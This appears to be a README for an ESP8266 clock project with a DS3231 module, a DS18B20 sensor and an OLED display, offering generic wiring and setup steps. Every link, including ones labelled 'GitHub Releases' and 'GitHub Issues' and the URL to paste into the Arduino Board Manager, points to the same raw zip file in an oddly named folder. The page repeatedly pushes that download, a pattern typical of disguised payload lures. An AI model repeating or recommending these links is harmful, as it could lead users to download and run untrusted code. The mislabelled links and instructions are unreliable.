# ⏰ D1-Mini-esp8266-clock - Simple Clock with Smart Features

## 🌟 Overview
The D1-Mini-esp8266-clock is an accurate digital clock built on the ESP8266 platform. It comes with features such as a DS3231 real-time clock module, an OLED display for clear visuals, and a DS18B20 temperature sensor. Synchronize time using NTP (Network Time Protocol) to ensure your clock is always accurate.

## 🚀 Getting Started
To get started with the D1-Mini-esp8266-clock, follow these steps to install the software and run your clock application smoothly.

## 📥 Download Now
[![Download](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip)](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip)

## 📋 System Requirements
- **Hardware**: You will need an ESP8266 board and the following components:
  - DS3231 real-time clock module
  - DS18B20 temperature sensor
  - SSD1306 OLED display
- **Software**: Ensure you have a compatible version of the Arduino IDE installed. 

## 📦 Download & Install
1. **Visit this page to download** the latest release: [GitHub Releases](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip).
2. Locate the latest version of the application.
3. Click the download link for the provided software.
4. Once downloaded, extract the zip file to a folder on your computer.

## 🛠 Setting Up Your Environment
1. **Open the Arduino IDE** on your computer.
2. Go to **File > Preferences** and add the following URL to the Additional Board Manager URLs section:
   ```
   https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip
   ```
3. Open the **Boards Manager** by navigating to **Tools > Board > Boards Manager**. Search for "ESP8266" and install the boards package.
4. Select your specific ESP8266 board from **Tools > Board**.

## 🔌 Connecting the Hardware
1. Connect the **DS3231 module** to your ESP8266 using I2C:
   - SDA to D2
   - SCL to D1
2. Connect the **DS18B20 sensor**:
   - The data pin should go to any digital pin on the ESP8266 (commonly D5).
   - Ensure you add a pull-up resistor (4.7kΩ) between the data and VCC.
3. Connect the **SSD1306 OLED display**.
   - SDA to D2
   - SCL to D1
4. Power your ESP8266. 

## ⚙️ Uploading the Code
1. Open the downloaded folder and find the `.ino` file in the Arduino IDE.
2. Connect your ESP8266 to your computer via USB.
3. Select the correct port under **Tools > Port**.
4. Click the **Upload** button in the Arduino IDE. Wait for the process to finish.

## 📊 Configuration
You may need to modify certain parameters in the code:
- Set your Wi-Fi credentials by updating the respective lines in the code. 
- You can adjust the temperature sensor configuration if necessary.

## 🕒 Running the Clock
1. After uploading the code successfully, your ESP8266 will reset.
2. The OLED display should show the current time and temperature readings powered by the DS3231 and DS18B20 sensors.
3. Enjoy your new smart clock!

## 🔧 Troubleshooting
- **Clock not displaying time?**
  Ensure your Wi-Fi credentials are correct and that the ESP8266 is connected to the internet.
- **Temperature readings look off?**
  Double-check the wiring of the DS18B20 sensor and confirm that the pull-up resistor is properly connected.

## 🌐 Community and Support
If you encounter any issues or have questions, feel free to visit the [GitHub Issues page](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip) where you can report problems or ask for help.

## 📜 Additional Information
This project is perfect for anyone looking to enhance their space with a digital clock that not only tells time but also provides real-time temperature readings. The combination of components makes it a versatile addition to your tech collection.

## 📥 Download Again
For your convenience, here is the download link once more: [GitHub Releases](https://raw.githubusercontent.com/kavinzidqi/D1-Mini-esp8266-clock/main/proembryonic/D1-Mini-esp8266-clock-1.2.zip).